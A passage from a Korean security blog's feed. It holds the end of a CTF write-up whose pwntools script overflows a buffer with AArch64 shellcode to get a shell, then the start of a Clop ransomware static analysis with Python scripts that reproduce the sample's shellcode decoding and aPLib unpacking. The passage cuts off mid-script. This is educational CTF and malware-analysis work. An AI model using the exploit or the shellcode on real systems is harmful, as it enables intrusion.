class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="am"><a href="#am" class="headerlink" title="am"></a>am</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./am&#x27;])</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./am&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400E14</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x412078</span></span><br><span class="line">malloc = <span class="number">0x412088</span></span><br><span class="line">count = <span class="number">0x4120d8</span></span><br><span class="line">syscall = <span class="number">0x400938</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">4</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line">stack = leak - <span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x70</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += p64(0x04136b0)</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      <category domain="https://pwnkidhn.github.io/tags/write-up/">write-up</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/20/2021-10-21-whitehatcon_CTF_2021/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Clop Ransomware</title>
      <link>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/</link>
      <guid>https://pwnkidhn.github.io/2021/05/24/2021-05-25-Clop/</guid>
      <pubDate>Mon, 24 May 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;Clop // Ransomware&lt;/center&gt; 


&lt;h1 id=&quot;File-info&quot;&gt;&lt;a href=&quot;#File-info&quot; class=&quot;headerlink&quot; title=&quot;File info&quot;&gt;&lt;/a&gt;File info&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;Info&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Value&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;SHA256&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;File Size&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;183KB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;File Type&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;.exe(win32)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;Function&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Crypto&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>Clop // Ransomware</center> <h1 id="File-info"><a href="#File-info" class="headerlink" title="File info"></a>File info</h1><table><thead><tr><th align="center">Info</th><th align="center">Value</th></tr></thead><tbody><tr><td align="center">SHA256</td><td align="center">3d94c4a92382c5c45062d8ea0517be4011be8ba42e9c9a614a99327d0ebdf05b</td></tr><tr><td align="center">File Size</td><td align="center">183KB</td></tr><tr><td align="center">File Type</td><td align="center">.exe(win32)</td></tr><tr><td align="center">Function</td><td align="center">Crypto</td></tr></tbody></table><span id="more"></span><h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><h3 id="분석환경"><a href="#분석환경" class="headerlink" title="분석환경"></a>분석환경</h3><ul><li>OS : Windows10</li><li>Tools : IDA Pro, 010Editor</li></ul><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><img src="https://user-images.githubusercontent.com/49066484/119482051-62787800-bd8e-11eb-8c95-465fce53284a.png" alt="그림1"></p><p>Clop Sample을 다운 받은 후 IDA로 확인했을때의 모습이다. 바이너리가 호출하는 함수의 개수가 적은 것으로 보아 바로 악성행위를 분석할 수 있을 것 같지 않다.  <code>Line115</code>에서 for문을 500000번을 도는데 이는 단순히 동적 분석을 방해하는 fake코드 인 것 같다. 해당 루프를 탈출하면 <code>Line140</code>의 조건문으로 들어가게 된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119482059-64423b80-bd8e-11eb-917c-a2353c279bb4.png" alt="그림2"></p><p>조건문안에는 쓰이지 않는 값들을 변수에 할당해주며 마지막에 <code>401000()</code>을 호출한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119483549-0dd5fc80-bd90-11eb-83ec-e440d60596cd.png" alt="그림3"></p><p><code>401000()</code>에서는 <code>VirtualAlloc</code>을 통해 메모리를 할당하게 되는데 빨간 박스 부분에서 할당한 메모리에 값을 쓰게된다. 여기서 <code>Line 176, 183, 185</code>가 연산에 쓰이는 핵심 코드이며 나머지는 쓰레기 코드이다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119483553-0f072980-bd90-11eb-98fb-d364210b2444.png" alt="그림4"></p><p>위 과정에서 입력한 내용을 <code>Line232</code>에서 호출하는 것으로 보아, 다음 단계로 넘어가기 위해 <code>Shellcode</code>를 쓰고 호출하는 것을 예상할 수 있다.  내용을 입력할 때 사용한 코드를 아래와 같이 python으로 똑같이 구현하여 쉘코드를 추출할 수 있었다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;clop&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x933C</span>)</span><br><span class="line">    shellcode = f.read(<span class="number">1380</span>*<span class="number">4</span>)</span><br><span class="line">  </span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1380</span>): </span><br><span class="line">    decode += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,((<span class="number">0x4559</span> ^ ROL4(<span class="number">0x4559</span> ^ struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>,shellcode[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>])[<span class="number">0</span>],<span class="number">9</span>)) - i) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decoded.bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decode)</span><br></pre></td></tr></table></figure><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><img src="https://user-images.githubusercontent.com/49066484/119485756-68705800-bd92-11eb-8017-231cc6686fbf.png" alt="그림5"></p><p>Step 1에서 추출한 Shellcode를 IDA로 확인한 모습니다. TerminateThread, Virtual..와 같은 문자열이 있는걸 확인할 수 있고 이는 성공적으로 두번째 단계에 들어왔음을 의미한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119485758-69a18500-bd92-11eb-9a72-f491f7abf3db.png" alt="그림6"></p><p>Step 1에서 인자로 받아온 Kernel32와 GetProcAddress를 통해 필요한 함수 주소를 알아온다. 성공적으로 모든 함수의 주소를 알아 왔다면 VirtualQuery 함수를 호출한다. </p><p><img src="https://user-images.githubusercontent.com/49066484/119487256-1b8d8100-bd94-11eb-926a-0b90e4076009.png" alt="그림7"></p><p>VirtualQuery함수는 프로세스의 특정 메모리의 정보, 권한을 얻어온다. 여기서 <code>lpAddress</code>의 인자 값으로 <code>retaddr</code>이 들어갔는데 이 주소는 Step 1에서 Shellcode 호출 후 다음으로 실행될 주소이다. 이는 이전 Step 의 바이너리의 ImageBase주소의 정보를 얻기 위함으로 예상된다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119488156-30b6df80-bd95-11eb-9bae-185f1498de93.png" alt="그림8"></p><p><code>Line265 269</code>에서 args[2],args[4]만큼의 크기를 VirtualAlloc한다. 여기서 args는 Step 1에서 Shellcode를 호출 할 때의 인자값들로 아래 그림을 참고하면 args[2]는 3번째 인자인 <code>0x19d48</code> args[4]는 5번째 인자인 <code>0x20200</code>임을 알 수 있다.</p><p><img src="https://user-images.githubusercontent.com/49066484/119489985-3f05fb00-bd97-11eb-9792-167a31b8725a.png" alt="그림9"></p><p><img src="https://user-images.githubusercontent.com/49066484/119489986-3f9e9180-bd97-11eb-89be-7d335f941ab5.png" alt="그림10"></p><p>각각 크기로 VirtualAlloc을 한 후, 반복문을 통해 <code>0x19d48</code>만큼 할당한 메모리에 값을 쓴다. 이 과정에서는 Step 1에서 Shellcode를 추출할 때 보였던 코드가 있으며, 이는 다음 단계로 넘어가는 Shellcode를 추출하는 것임을 다시 한 번 예상할 수 있다. Shellcode를 추출 한 후   <code>aplib_decompress</code>을 호출한다. 이때 인자는 <code>0x19d48</code>만큼 할당한 메모리와 <code>0x20200</code>만큼 할당한 메모리가 되는데 추출 한 Shellcode를 decompress하여 해당 내용을 더 큰 메모리에 쓰는 역할을 한다. </p><p>다음 단계로 넘어가기 위해 Step 1과 동일하게 해당 코드를 python으로 구현하였고, 이 때 decompress하는 과정은 아래 모듈을 사용했다.</p><ul><li><a href="https://github.com/snemes/aplib/blob/master/aplib.py">https://github.com/snemes/aplib/blob/master/aplib.py</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc32</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">&#x27;APLib&#x27;</span>, <span class="string">&#x27;decompress&#x27;</span>]</span><br><span class="line">__version__ = <span class="string">&#x27;0.6&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Sandor Nemes&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APLib</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    __slots__ = <span class="string">&#x27;source&#x27;</span>, <span class="string">&#x27;destination&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;bitcount&#x27;</span>, <span class="string">&#x27;strict&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, source, strict=<span class="literal">True</span></span>):</span></span><br><span class="line">        self.source = BytesIO(source)</span><br><span class="line">        self.destination = <span class="built_in">bytearray</span>()</span><br><span class="line">        self.tag = <span class="number">0</span></span><br><span class="line">        self.bitcount = <span class="number">0</span></span><br><span class="line">        self.strict = <span class="built_in">bool</span>(strict)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getbit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># check if tag is empty</span></span><br><span class="line">        self.bitcount -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self.bitcount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># load next tag</span></span><br><span class="line">            self.tag = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">            self.bitcount = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># shift bit out of tag</span></span><br><span class="line">        bit = self.tag &gt;&gt; <span class="number">7</span> &amp; <span class="number">1</span></span><br><span class="line">        self.tag &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bit</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getgamma</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># input gamma2-encoded bits</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            result = (result &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.getbit():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">depack</span>(<span class="params">self</span>):</span></span><br><span class="line">        r0 = -<span class="number">1</span></span><br><span class="line">        lwm = <span class="number">0</span></span><br><span class="line">        done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># first byte verbatim</span></span><br><span class="line">            self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># main decompression loop</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line">                <span class="keyword">if</span> self.getbit():</span><br><span class="line">                    <span class="keyword">if</span> self.getbit():</span><br><span class="line">                        <span class="keyword">if</span> self.getbit():</span><br><span class="line">                            offs = <span class="number">0</span></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                offs = (offs &lt;&lt; <span class="number">1</span>) + self.getbit()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                self.destination.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">                            lwm = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            offs = <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = <span class="number">2</span> + (offs &amp; <span class="number">1</span>)</span><br><span class="line">                            offs &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs:</span><br><span class="line">                                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                    self.destination.append(self.destination[-offs])</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line">                            lwm = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        offs = self.getgamma()</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> lwm == <span class="number">0</span> <span class="keyword">and</span> offs == <span class="number">2</span>:</span><br><span class="line">                            offs = r0</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">if</span> lwm == <span class="number">0</span>:</span><br><span class="line">                                offs -= <span class="number">3</span></span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                offs -= <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            offs &lt;&lt;= <span class="number">8</span></span><br><span class="line">                            offs += <span class="built_in">ord</span>(self.source.read(<span class="number">1</span>))</span><br><span class="line">                            length = self.getgamma()</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">32000</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &gt;= <span class="number">1280</span>:</span><br><span class="line">                                length += <span class="number">1</span></span><br><span class="line">                            <span class="keyword">if</span> offs &lt; <span class="number">128</span>:</span><br><span class="line">                                length += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                                self.destination.append(self.destination[-offs])</span><br><span class="line"></span><br><span class="line">                            r0 = offs</span><br><span class="line"></span><br><span class="line">                        lwm = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.destination += self.source.read(<span class="number">1</span>)</span><br><span class="line">                    lwm = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> (TypeError, IndexError):</span><br><span class="line">            <span class="keyword">if</span> self.strict:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;aPLib decompression error&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(self.destination)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">data, strict=<span class="literal">False</span></span>):</span></span><br><span class="line">    packed_size = <span class="literal">None</span></span><br><span class="line">    packed_crc = <span class="literal">None</span></span><br><span class="line">    orig_size = <span class="literal">None</span></span><br><span class="line">    orig_crc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;AP32&#x27;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(data) &gt;= <span class="number">24</span>:</span><br><span class="line">        <span class="comment"># data has an aPLib header</span></span><br><span class="line">        header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(<span class="string">&#x27;=IIIII&#x27;</span>, data, <span class="number">4</span>)</span><br><span class="line">        data = data[header_size : header_size + packed_size]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> packed_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_size != <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> packed_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> packed_crc != crc32(data):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Packed data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    result = APLib(data, strict=strict).depack()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> strict:</span><br><span class="line">        <span class="keyword">if</span> orig_size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_size != <span class="built_in">len</span>(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data size is incorrect&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> orig_crc <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> orig_crc != crc32(result):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Unpacked data checksum is incorrect&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># self-test</span></span><br><span class="line">    data = <span class="string">b&#x27;T\x00he quick\xecb\x0erown\xcef\xaex\x80jumps\xed\xe4veur`t?lazy\xead\xfeg\xc0\x00&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span> decompress(data) == <span class="string">b&#x27;The quick brown fox jumps over the lazy dog&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL4</span>(<span class="params">x,n</span>):</span></span><br><span class="line">    x = (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span>-n))</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;clop&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0xA8D0</span>)</span><br><span class="line">    data = f.read(<span class="number">0x19d48</span>)</span><br><span class="line">     </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">decode = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">0x19d48</span>:</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        i = i + <span class="number">2</span></span><br><span class="line">    result += data[i].to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    i = i + 